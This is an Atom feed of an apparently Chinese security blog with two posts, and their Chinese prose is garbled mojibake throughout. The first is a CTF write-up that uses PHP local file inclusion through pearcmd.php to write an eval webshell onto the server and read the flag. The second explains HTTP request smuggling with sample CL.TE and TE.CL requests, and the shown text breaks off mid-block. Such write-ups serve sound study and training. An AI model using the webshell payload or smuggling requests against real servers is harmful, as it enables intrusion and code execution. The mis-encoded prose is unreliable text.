<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>p0l1st&#39;s blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-12-23T09:01:04.860Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>p0l1</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ä»ä¸€é“é¢˜å­¦ä¹ LFIåŒ…å«pearcmdå‘½ä»¤æ‰§è¡Œ</title>
    <link href="http://example.com/2023/12/23/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0LFI%E5%8C%85%E5%90%ABpearcmd%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>http://example.com/2023/12/23/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0LFI%E5%8C%85%E5%90%ABpearcmd%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
    <published>2023-12-23T08:17:06.000Z</published>
    <updated>2023-12-23T09:01:04.860Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pear"><a href="#pear" class="headerlink" title="pear"></a>pear</h1><p>pearå…¨ç§°PHP Extension and Application Reposition(phpæ‰©å±•å’Œåº”ç”¨ä»“åº“)ï¼Œåœ¨dockerä¸­é»˜è®¤å®‰è£…ï¼Œè·¯å¾„ä¸º&#x2F;usr&#x2F;loacl&#x2F;lib&#x2F;php</p><p>register_argc_argvä¸ºOnæ—¶ï¼Œ$_SERVER[â€˜argvâ€™]å’Œ$_SERVER[â€˜argcâ€™]ä¼šè®°å½•ä¸€äº›ä¸œè¥¿ã€‚åœ¨webä¸­ï¼Œä¼ å‚æ—¶ä½¿ç”¨+è¿æ¥çš„å€¼çš„ä¸ªæ•°å°±æ˜¯argcï¼Œå„ä¸ªå‚æ•°è¢«å­˜åˆ°argvé‡Œã€‚</p><p>exam:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argc&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>0.php?a&#x3D;a</p><p><img src="/../images/image-20231223164158153.png" alt="image-20231223164158153"></p><p>0.php?a&#x3D;a+b+c</p><p><img src="/../images/image-20231223164214690.png" alt="image-20231223164214690"></p><p>è¿™é‡Œæ˜¯æ ¹æ®+åšåˆ†éš”ç¬¦æ¥åˆ¤æ–­ã€‚</p><h1 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h1><p>ç›®æ ‡è£…äº†pearç»„ä»¶ï¼Œregister_argc_argvä¸ºOnï¼Œå¯ä»¥åŒ…å«åˆ°pearcmd.phpæ–‡ä»¶(ä¸å—open_basedirå’Œæ–‡ä»¶åç¼€é™åˆ¶)</p><h1 id="åˆ©ç”¨åŸç†"><a href="#åˆ©ç”¨åŸç†" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h1><p>å½“æ–‡ä»¶åŒ…å«äº†pearcmd.phpæ—¶å°±ä¼šæ‰§è¡Œ$_SERVER[â€˜argvâ€™]ä¸­çš„å‘½ä»¤</p><h1 id="Include-ğŸ"><a href="#Include-ğŸ" class="headerlink" title="Include ğŸ"></a>Include ğŸ</h1><p>æ‰“å¼€ç¯å¢ƒ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag|log|session|filter|input|data/i&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">        <span class="comment"># Something in phpinfo.php!</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>æç¤ºä¿¡æ¯phpinfo.php</p><p>è®¿é—®</p><p><img src="/../images/image-20231223164741894.png" alt="image-20231223164741894"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fake&#123;Check_register_argc_argv&#125;</span><br></pre></td></tr></table></figure><p>çœ‹çœ‹register_argc_argv</p><p><img src="/../images/image-20231223164815465.png" alt="image-20231223164815465"></p><p>ä¸ºOn</p><p>å°è¯•æ„é€ payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/usr/local/lib/php/pearcmd&amp;+config-create+/&lt;?=@eval($_POST[&#x27;a&#x27;])?&gt;+./a.php</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¦æ³¨æ„ï¼Œç›´æ¥getä¼ å‚urlä¼šæŠŠ&lt;ç­‰å­—ç¬¦è¿›è¡Œç¼–ç ï¼Œå¯ä»¥ä½¿ç”¨burp</p><p><img src="/../images/image-20231223165900712.png" alt="image-20231223165900712"></p><p>ç›´æ¥è¯»flag</p><p><img src="/../images/image-20231223165945181.png" alt="image-20231223165945181"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pear&quot;&gt;&lt;a href=&quot;#pear&quot; class=&quot;headerlink&quot; title=&quot;pear&quot;&gt;&lt;/a&gt;pear&lt;/h1&gt;&lt;p&gt;pearå…¨ç§°PHP Extension and Application Reposition(phpæ‰©å±•å’Œåº”ç”¨ä»“åº“)ï¼Œåœ¨do</summary>
      
    
    
    
    
    <category term="ctf webå®‰å…¨" scheme="http://example.com/tags/ctf-web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>httpè¯·æ±‚èµ°ç§</title>
    <link href="http://example.com/2023/12/22/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"/>
    <id>http://example.com/2023/12/22/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/</id>
    <published>2023-12-22T07:17:54.000Z</published>
    <updated>2023-12-22T07:26:55.618Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ä»€ä¹ˆæ˜¯HTTPè¯·æ±‚èµ°ç§"><a href="#ä»€ä¹ˆæ˜¯HTTPè¯·æ±‚èµ°ç§" class="headerlink" title="ä»€ä¹ˆæ˜¯HTTPè¯·æ±‚èµ°ç§"></a>ä»€ä¹ˆæ˜¯HTTPè¯·æ±‚èµ°ç§</h1><p>HTTPè¯·æ±‚èµ°ç§æ˜¯ä¸€ç§å¹²æ‰°ç½‘ç«™å¤„ç†ä»ä¸€ä¸ªæˆ–å¤šä¸ªç”¨æˆ·æ¥æ”¶çš„HTTPè¯·æ±‚åºåˆ—æ–¹å¼çš„æŠ€æœ¯ã€‚</p><p>æ”»å‡»è€…å¯ä»¥ç»•è¿‡å®‰å…¨æ§åˆ¶ï¼Œæœªç»æˆæƒç›´æ¥è®¿é—®æ•æ„Ÿæ•°æ®ã€‚</p><h1 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h1><h2 id="keep-aliveä¸pipeline"><a href="#keep-aliveä¸pipeline" class="headerlink" title="keep-aliveä¸pipeline"></a>keep-aliveä¸pipeline</h2><p>ä¸ºäº†ç¼“è§£æºç«™çš„å‹åŠ›ï¼Œä¸€èˆ¬ä¼šåœ¨ç”¨æˆ·å’Œåç«¯æœåŠ¡å™¨ä¹‹é—´åŠ è®¾å‰ç½®æœåŠ¡å™¨ï¼Œç”¨ä»¥ç¼“å­˜ã€ç®€å•æ ¡éªŒã€è´Ÿè½½å‡è¡¡ç­‰ï¼Œè€Œå‰ç½®æœåŠ¡å™¨ä¸åç«¯æœåŠ¡å™¨å¾€å¾€æ˜¯åœ¨å¯é çš„ç½‘ç»œåŸŸä¸­ï¼Œipä¹Ÿæ˜¯ç›¸å¯¹å›ºå®šçš„ï¼Œæ‰€ä»¥å¯ä»¥é‡ç”¨TCPè¿æ¥æ¥å‡å°‘é¢‘ç¹TCPæ¡æ‰‹å¸¦æ¥çš„å¼€é”€ï¼Œè¿™å°±ç”¨åˆ°äº†HTTP1.1ä¸­çš„<strong>keep-alive</strong>å’Œ<strong>pipeline</strong>ç‰¹æ€§</p><ul><li>keep-alive:åœ¨HTTPè¯·æ±‚ä¸­å¢åŠ ä¸€ä¸ªç‰¹æ®Šçš„è¯·æ±‚å¤´Connection:keep-aliveï¼Œå‘Šè¯‰æœåŠ¡å™¨æ¥æ”¶å®Œè¿™æ¬¡HTTPè¯·æ±‚åï¼Œä¸è¦å…³é—­TCPé“¾æ¥ï¼Œä»¥ä¾¿äºåé¢å¯¹ç›¸åŒæœåŠ¡å™¨è¯·æ±‚æ—¶é‡ç”¨è¿™ä¸€ä¸ªTCPé“¾æ¥ã€‚è¿™æ ·ä¸€æ¥åªéœ€è¦è¿›è¡Œä¸€æ¬¡TCPæ¡æ‰‹ï¼Œå‡å°‘äº†æœåŠ¡å™¨çš„å¼€é”€ï¼Œè¿™ä¸ªç‰¹æ€§åœ¨HTTP1.1ä¸­é»˜è®¤å¼€å¯ã€‚</li><li>pipeline:åŸºäºkeep-aliveå®ç°ï¼Œå®¢æˆ·ç«¯å¯ä»¥åƒæµæ°´çº¿ä¸€æ ·å‘é€è‡ªå·±çš„HTTPè¯·æ±‚ï¼Œè€Œä¸éœ€è¦ç­‰å¾…æœåŠ¡å™¨çš„å“åº”ã€‚æœåŠ¡å™¨æ¥æ”¶è¯·æ±‚åï¼Œéœ€è¦éµå¾ªå…ˆå…¥åå‡ºæœºåˆ¶ï¼Œå°†è¯·æ±‚å’Œå“åº”ä¸¥æ ¼å¯¹åº”ï¼Œå†å°†å“åº”å‘é€ç»™å®¢æˆ·ç«¯ã€‚ç›®å‰æµè§ˆå™¨é»˜è®¤ä¸å¼€å¯pipelineï¼Œä½†ä¸€èˆ¬æœåŠ¡å™¨éƒ½æ”¯æŒã€‚</li></ul><p>æ­£å¸¸æƒ…å†µä¸‹çš„HTTPè¯·æ±‚:</p><p><img src="/../images/image-20231222152631080.png" alt="image-20231222152631080"></p><p>å‰ç½®æœåŠ¡å™¨ä¸åç«¯æœåŠ¡å™¨åº”å½“åœ¨HTTPè¯·æ±‚çš„è¾¹ç•Œåˆ’åˆ†ä¸Šè¾¾æˆä¸€è‡´ï¼Œå¦åˆ™ä¼šå¯¼è‡´å¼‚å¸¸</p><p><img src="/../images/image-20231222152650380.png" alt="image-20231222152650380"> </p><h2 id="èµ°ç§æ”»å‡»å®ç°"><a href="#èµ°ç§æ”»å‡»å®ç°" class="headerlink" title="èµ°ç§æ”»å‡»å®ç°"></a>èµ°ç§æ”»å‡»å®ç°</h2><p>å½“æˆ‘ä»¬å‘ä»£ç†æœåŠ¡å™¨å‘é€ä¸€ä¸ªæ¯”è¾ƒæ¨¡ç³Šçš„HTTPè¯·æ±‚æ—¶ï¼Œç”±äºä¸¤è€…æœåŠ¡å™¨å®ç°æ–¹å¼ä¸åŒï¼Œå¯èƒ½ä»£ç†æœåŠ¡å™¨è®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªæ­£å¸¸çš„HTTPè¯·æ±‚ï¼Œç„¶åå°†å…¶è½¬å‘ç»™äº†åç«¯çš„æºç«™æœåŠ¡å™¨ã€‚ä½†æºç«™æœåŠ¡å™¨ç»è¿‡è§£æå¤„ç†åï¼Œåªè®¤ä¸ºå…¶ä¸­ä¸€éƒ¨åˆ†ä¸ºæ­£å¸¸è¯·æ±‚ï¼Œå‰©ä¸‹çš„å¦ä¸€éƒ¨åˆ†åˆ™æ˜¯èµ°ç§çš„è¯·æ±‚ï¼Œå½“è¿™éƒ¨åˆ†è¯·æ±‚å¯¹æ­£å¸¸ç”¨æˆ·çš„è¯·æ±‚é€ æˆå½±å“åï¼Œå°±å®ç°äº†HTTPè¯·æ±‚èµ°ç§æ”»å‡»ã€‚</p><h2 id="CLä¸TE"><a href="#CLä¸TE" class="headerlink" title="CLä¸TE"></a>CLä¸TE</h2><p>CLï¼š<strong>Content-Length</strong></p><p>TEï¼š<strong>Transfer-Encoding</strong></p><p><strong>Transfer-Encoding</strong>æŒ‡å®šç”¨äºä¼ è¾“è¯·æ±‚ä¸»ä½“çš„ç¼–ç æ–¹å¼ï¼Œå¯ä»¥ä½¿ç”¨çš„å€¼æœ‰chunked,compress,deflate,gzip,identity</p><p>è®¾ç½®äº†<strong>Transfer-Encoding: chunked</strong>åï¼Œè¯·æ±‚ä¸»ä½“æŒ‰ä¸€ç³»åˆ—å—çš„å½¢å¼å‘é€ï¼Œå¹¶çœç•¥<strong>Content-Length</strong>ã€‚åœ¨æ¯ä¸ªå—çš„å¼€å¤´éœ€è¦ä½¿ç”¨åå…­è¿›åˆ¶æ•°çŸ¥åå½“å‰å—çš„é•¿åº¦ï¼Œæ•°å€¼åæ¥<strong>\r\n</strong>(ä¸¤ä¸ªå­—èŠ‚)ï¼Œå†æ¥<strong>\r\n</strong>è¡¨ç¤ºæ­¤å—çš„ç»“æŸã€‚æœ€åä½¿ç”¨é•¿åº¦ä¸º0çš„å—è¡¨ç¤ºç»ˆæ­¢å—ã€‚ç»ˆæ­¢å—åæ˜¯ä¸€ä¸ªtralierï¼Œç”±0æˆ–å¤šä¸ªå®ä½“å¤´ç»„æˆ ï¼Œå¯ä»¥ç”¨æ¥å­˜æ”¾å¯¹æ•°æ®çš„æ•°å­—ç­¾åã€‚</p><p>ä¾‹å¦‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 1.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">b</span><br><span class="line">q=smuggling</span><br><span class="line">6</span><br><span class="line">hahaha</span><br><span class="line">0</span><br><span class="line">[ç©ºç™½è¡Œ]</span><br><span class="line">[ç©ºç™½è¡Œ]</span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„:</strong></p><ul><li><strong>Content-Length</strong>éœ€è¦å°†è¯·æ±‚ä¸»ä½“ä¸­çš„<strong>\r\n</strong>æ‰€å çš„ä¸¤ä¸ªå­—èŠ‚è®¡ç®—åœ¨å†…ï¼Œè€Œå—é•¿åº¦è¦å¿½ç•¥å—å†…å®¹è¡¨ç¤ºç»ˆæ­¢çš„<strong>\r\n</strong></li><li>è¯·æ±‚å¤´ä¸è¯·æ±‚ä¸»ä½“ä¹‹é—´æœ‰ä¸€ä¸ªç©ºè¡Œï¼Œæ˜¯è§„èŒƒè¦æ±‚çš„ç»“æ„ï¼Œä¸è®¡å…¥<strong>Content-Length</strong></li></ul><h1 id="èµ°ç§æ–¹å¼"><a href="#èµ°ç§æ–¹å¼" class="headerlink" title="èµ°ç§æ–¹å¼"></a>èµ°ç§æ–¹å¼</h1><p>HTTPè¯·æ±‚èµ°ç§æ”»å‡»æ¶‰åŠå°†<strong>Content-Length</strong>æ ‡å¤´å’Œ<strong>Transfer-Encoding</strong>æ ‡å¤´éƒ½æ”¾ç½®åœ¨å•ä¸ªHTTPè¯·æ±‚ä¸­å¹¶è¿›è¡Œå¤„ç†ï¼Œä»¥ä¾¿å‰ç«¯æœåŠ¡å™¨å’Œåç«¯æœåŠ¡å™¨ä»¥ä¸åŒçš„æ–¹å¼å¤„ç†è¯·æ±‚ã€‚</p><ul><li><p>CL.TEï¼šå‰ç«¯æœåŠ¡å™¨ä½¿ç”¨Content-Lengthæ ‡å¤´ï¼Œåç«¯æœåŠ¡å™¨ä½¿ç”¨Transfer-Encodingæ ‡å¤´</p></li><li><p>TE.CLï¼šå‰ç«¯æœåŠ¡å™¨ä½¿ç”¨Transfer-Encodingæ ‡å¤´ï¼Œåç«¯æœåŠ¡å™¨ä½¿ç”¨Content-Lengthæ ‡å¤´</p></li><li><p>TE.TEï¼šå‰ç«¯æœåŠ¡å™¨å’Œåç«¯æœåŠ¡å™¨éƒ½æ”¯æŒTransfer-Encodingæ ‡å¤´ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡å¯¹æ ‡å¤´è¿›è¡ŒæŸç§æ–¹å¼çš„æ··æ·†æ¥è¯±å¯¼å…¶ä¸­ä¸€å°æœåŠ¡å™¨ä¸å¯¹å…¶è¿›è¡Œå¤„ç†</p></li></ul><h2 id="CLä¸ä¸º0"><a href="#CLä¸ä¸º0" class="headerlink" title="CLä¸ä¸º0"></a>CLä¸ä¸º0</h2><p>æ‰€æœ‰ä¸æºå¸¦è¯·æ±‚ä½“çš„HTTPè¯·æ±‚éƒ½æœ‰å¯èƒ½å—æ­¤å½±å“ã€‚</p><p>å‰ç«¯æœåŠ¡å™¨å…è®¸GETè¯·æ±‚æºå¸¦è¯·æ±‚ä½“ï¼Œè€Œåç«¯æœåŠ¡å™¨ä¸å…è®¸GETè¯·æ±‚æºå¸¦è¯·æ±‚ä½“ï¼Œå®ƒä¼šç›´æ¥å¿½ç•¥GETè¯·æ±‚ä¸­çš„<strong>Content-Length</strong>å¤´ï¼Œä¸è¿›è¡Œå¤„ç†ã€‚</p><p>exam:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br><span class="line">Content-Length: 44\r\n</span><br><span class="line"></span><br><span class="line">GET / secret HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p><strong>æ”»å‡»æµç¨‹ï¼š</strong></p><p>å‰ç«¯æœåŠ¡å™¨æ”¶åˆ°è¯¥è¯·æ±‚ï¼Œè¯»å–<strong>Content-Length</strong>ï¼Œåˆ¤æ–­è¿™æ˜¯ä¸€ä¸ªå®Œæ•´çš„è¯·æ±‚ï¼Œè½¬å‘ç»™åç«¯æœåŠ¡å™¨</p><p>è€Œåç«¯æœåŠ¡å™¨ä¸å¯¹<strong>Content-Length</strong>ä½œå¤„ç†ï¼Œç”±äºpipelineå­˜åœ¨ï¼Œåç«¯æœåŠ¡å™¨è®¤ä¸ºè¿™æ˜¯ä¸¤ä¸ªè¯·æ±‚</p><p>1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br></pre></td></tr></table></figure><p>2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET / secret HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br></pre></td></tr></table></figure><h2 id="CL-CL"><a href="#CL-CL" class="headerlink" title="CL-CL"></a>CL-CL</h2><p><strong>RFC7320è§„èŒƒ</strong></p><p>è§„å®šå½“æœåŠ¡å™¨æ”¶åˆ°çš„è¯·æ±‚ä¸­åŒ…å«ä¸¤ä¸ªContent-Lengthè€Œä¸”ä¸¤è€…çš„å€¼ä¸åŒæ—¶ï¼Œéœ€è¦è¿”å›400é”™è¯¯</p><p>æœ‰äº›æœåŠ¡å™¨ä¸ä¼šä¸¥æ ¼å®ç°è¯¥è§„èŒƒï¼Œå‡è®¾ä¸­é—´çš„ä»£ç†æœåŠ¡å™¨å’Œåç«¯çš„æºæœåŠ¡å™¨åœ¨æ”¶åˆ°ç±»ä¼¼è¯·æ±‚æ—¶ï¼Œéƒ½ä¸ä¼šè¿”å›400ï¼Œä½†æ˜¯ä¸­é—´ä»£ç†æœåŠ¡å™¨æŒ‰ç…§ç¬¬ä¸€ä¸ªContent-Lengthçš„å€¼å¯¹è¯·æ±‚è¿›è¡Œå¤„ç†ï¼Œè€Œåç«¯æºæœåŠ¡å™¨æŒ‰ç…§ç¬¬äºŒä¸ªContent-Lengthçš„å€¼è¿›è¡Œå¤„ç†</p><p>exam:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br><span class="line">Content-Length: 8\r\n</span><br><span class="line">Content-Length: 7\r\n</span><br><span class="line"></span><br><span class="line">12345\r\n</span><br><span class="line">a</span><br></pre></td></tr></table></figure><p><strong>æ”»å‡»æµç¨‹ï¼š</strong></p><p>ä¸­é—´ä»£ç†æœåŠ¡å™¨è·å–åˆ°çš„æ•°æ®åŒ…çš„é•¿åº¦ä¸º8ï¼Œç„¶åè½¬å‘ç»™åç«¯æºç«™æœåŠ¡å™¨</p><p>è€Œåç«¯æœåŠ¡å™¨è·å–åˆ°çš„æ•°æ®åŒ…é•¿åº¦ä¸º7ï¼Œåç«¯æœåŠ¡å™¨è®¤ä¸ºå·²ç»è¯»å–å®Œæ¯•ï¼Œç„¶åç”Ÿæˆå“åº”</p><p>è€Œæ­¤æ—¶çš„ç¼“å†²åŒºè¿˜å‰©ä½™ä¸€ä¸ªå­—æ¯aï¼Œå¯¹äºåç«¯æœåŠ¡å™¨æ¥è¯´è¿™ä¸ªaæ˜¯ä¸‹ä¸€ä¸ªè¯·æ±‚çš„ä¸€éƒ¨åˆ†</p><p>å¦‚æœæ­¤æ—¶å¦ä¸€ç”¨æˆ·å‘é€è¯·æ±‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /index.html HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br></pre></td></tr></table></figure><p>å› ä¸ºä»£ç†æœåŠ¡å™¨å’ŒæºæœåŠ¡å™¨ä¹‹é—´é‡ç”¨TCPé“¾æ¥ï¼Œé‚£ä¹ˆaä¼šæ‹¼æ¥åˆ°è¿™ä¸ªè¯·æ±‚å‰é¢</p><p>å®é™…è¯·æ±‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aGET /index.html HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±å®ç°äº†ä¸€æ¬¡HTTPèµ°ç§æ”»å‡»ï¼Œè€Œä¸”è¿˜å¯ä»¥æ‰©å±•æˆç±»ä¼¼CSRFçš„æ”»å‡»æ–¹å¼</p><p>ä¸€èˆ¬æœåŠ¡å™¨éƒ½ä¸ä¼šæ¥æ”¶è¿™ç§å­˜åœ¨ä¸¤ä¸ªè¯·æ±‚å¤´çš„è¯·æ±‚æ–¹å¼ï¼Œä½†æ˜¯</p><p><strong>RFC2616è§„èŒƒ</strong></p><p>å¦‚æœæ”¶åˆ°åŒæ—¶å­˜åœ¨Content-Lengthå’ŒTransfer-Encodingè¿™ä¸¤ä¸ªè¯·æ±‚åŒ…æ—¶ï¼Œå¿…é¡»å¿½ç•¥Content-Length</p><h2 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE"></a>CL-TE</h2><p>å½“æ”¶åˆ°å­˜åœ¨ä¸¤ä¸ªè¯·æ±‚å¤´çš„è¯·æ±‚åŒ…æ—¶ï¼Œå‰ç«¯æœåŠ¡å™¨åªå¤„ç†Content-Lengthè¯·æ±‚å¤´ï¼Œåç«¯æœåŠ¡å™¨éµå®ˆRFC2616è§„å®šï¼Œå¿½ç•¥Content-Lengthï¼Œåªå¤„ç†Transfer-Encoding</p><p>exam:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br><span class="line">......</span><br><span class="line">Connection: keep-alive\r\n</span><br><span class="line">Content-Length: 6\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">a</span><br></pre></td></tr></table></figure><p><strong>æ”»å‡»æµç¨‹</strong></p><p>å‰ç«¯æœåŠ¡å™¨å¤„ç†Content-Lengthï¼Œæ‰€ä»¥è¿™æ˜¯ä¸€ä¸ªå®Œæ•´çš„è¯·æ±‚ï¼Œè¯·æ±‚ä½“é•¿åº¦ä¸º6</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">a</span><br></pre></td></tr></table></figure><p>è€Œåç«¯æœåŠ¡å™¨å¤„ç†Transfer-Encodingï¼Œå½“å®ƒè¯»åˆ°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>è®¤ä¸ºå·²ç»ç»“æŸ</p><p>aç•™åœ¨äº†ç¼“å†²åŒºï¼Œä¼šæ‹¼æ¥åˆ°ä¸‹ä¸€æ¬¡è¯·æ±‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">aPOST / HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>æœåŠ¡å™¨è§£ææ—¶ä¼šæŠ¥é”™ï¼Œé€ æˆè¯·æ±‚èµ°ç§</p><h2 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE-CL"></a>TE-CL</h2><p>å½“æ”¶åˆ°å­˜åœ¨ä¸¤ä¸ªè¯·æ±‚å¤´çš„è¯·æ±‚åŒ…æ—¶ï¼Œå‰ç«¯æœåŠ¡å™¨å¤„ç†Transfer-Encodingï¼Œåç«¯æœåŠ¡å™¨å¤„ç†Content-Length</p><p>exam:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br><span class="line">......</span><br><span class="line">Content-Length: 4\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">\r\n</span><br><span class="line">12\r\n</span><br><span class="line">aPOST / HTTP/1.1\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>å‰ç«¯æœåŠ¡å™¨å¤„ç†Transfer-Encodingï¼Œå½“è¯»åˆ°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0\r\n</span><br><span 